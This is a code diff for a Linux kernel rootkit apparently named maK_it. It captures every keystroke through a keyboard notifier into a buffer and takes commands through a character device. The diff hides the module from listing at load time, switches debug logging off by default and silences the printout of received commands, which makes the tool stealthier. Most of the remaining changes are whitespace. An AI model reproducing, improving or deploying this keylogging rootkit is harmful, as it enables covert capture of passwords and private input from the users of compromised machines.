@@ -53,7 +53,7 @@ static struct list_head *modKobjList;
 /*
  * --Debug Prints--
  */
-int debug = 1;
+int debug = 0;
 
 //Key press without shift
 static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
@@ -92,48 +92,48 @@ static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
 int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
 	struct keyboard_notifier_param *param = p;
    	if(kcode == KBD_KEYCODE && keyLogOn){
-        	if( param->value==42 || param->value==54 ){
-            		down(&s);
-            		if(param->down > 0){
-                		shiftPressed = 1;
+        if( param->value==42 || param->value==54 ){
+            down(&s);
+            if(param->down > 0){
+                shiftPressed = 1;
 			}
-            		else{
-                		shiftPressed = 0;
+            else{
+                shiftPressed = 0;
 			}
-            		up(&s);
-            		return NOTIFY_OK;
-        	}
+            up(&s);
+            return NOTIFY_OK;
+        }
 		//Store keys to buffer
-        	if(param->down){
-            		int i;
+        if(param->down){
+            int i;
 			char c;
 			down(&s);
 			i = 0;
 			if(shiftPressed){
 				while(i < strlen(keysShift[param->value])){
-					c = keysShift[param->value][i];
+				    c = keysShift[param->value][i];
 					i++;
 					*basePtr = c;
-                                	basePtr++;
-                                	if(basePtr == endPtr){
+                    basePtr++;
+                    if(basePtr == endPtr){
 						basePtr = keyBuffer;
 					}
 				}
 			}
-            		else{
+            else{
 				while(i < strlen(keys[param->value])){
-                                        c = keys[param->value][i];
-                                        i++;
-                                        *basePtr = c;
-                                        basePtr++;
-                                        if(basePtr == endPtr){
-                                                basePtr = keyBuffer;
-                                        }
-                                }
-              		}
-            		up(&s);
-        	}
-    	}
+                    c = keys[param->value][i];
+                    i++;
+                    *basePtr = c;
+                    basePtr++;
+                    if(basePtr == endPtr){
+                        basePtr = keyBuffer;
+                    }
+                }
+            }    
+            up(&s);
+        }
+    }
  	return NOTIFY_OK;
 }
 
@@ -208,7 +208,8 @@ static ssize_t write_dev(struct file *filp, const char *buff,
 			cmdPtr++;
 			i++;
 		}
-		printk(KERN_ALERT "maK_it: command: %s \n",commands);
+        if(debug == 1)
+    		printk(KERN_ALERT "maK_it: command: %s \n",commands);
 		if(strcmp(commands, "debug") == 0){
 			if(debug == 0){ debug = 1;}
 			else{ debug = 0;}
@@ -248,15 +249,15 @@ static int release_dev(struct inode *inode, struct file *filp){
 
 //File operations for device
 struct file_operations fops = {
-                                .owner = THIS_MODULE,
-                                .open = open_dev,
-                                .read = read_dev,
-				.write = write_dev,
-				.release = release_dev,
+    .owner = THIS_MODULE,
+    .open = open_dev,
+    .read = read_dev,
+	.write = write_dev,
+	.release = release_dev,
 };
 //Notifier handler
 static struct notifier_block nb = {
-        .notifier_call = key_notify
+    .notifier_call = key_notify
 };
 
 /*
@@ -264,6 +265,10 @@ static struct notifier_block nb = {
  */
 
 static int init_mod(void){
+
+    //hide module on start
+    hide_module();
+    
 	//Listen for keys.
 	register_keyboard_notifier(&nb);
 	sema_init(&s, 1);        
